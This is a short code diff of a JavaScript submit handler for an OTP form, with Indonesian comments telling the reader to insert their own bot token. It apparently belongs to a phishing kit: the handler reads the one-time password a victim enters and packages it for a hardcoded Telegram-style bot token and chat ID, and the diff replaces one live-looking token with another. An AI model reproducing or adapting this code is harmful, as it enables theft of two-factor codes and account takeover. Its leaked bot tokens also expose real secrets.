@@ -4,7 +4,7 @@ document.getElementById('otpform').addEventListener('submit', function(event) {
 
     const otp = document.getElementById('otp').value;
 
-    const token = '7376694883:AAGyPTpO0iJsT4-PQmc1VZOl3I95SS2lduo'; // Ganti dengan token bot Anda
+    const token = '7515844069:AAFgaTu5QS3CG70_uwkKwG1ND1BAKEgFngw'; // Ganti dengan token bot Anda
     const chatId = '8072206481'; // Ganti dengan ID chat Anda
 
     const text = `OTP: ${otp} `;
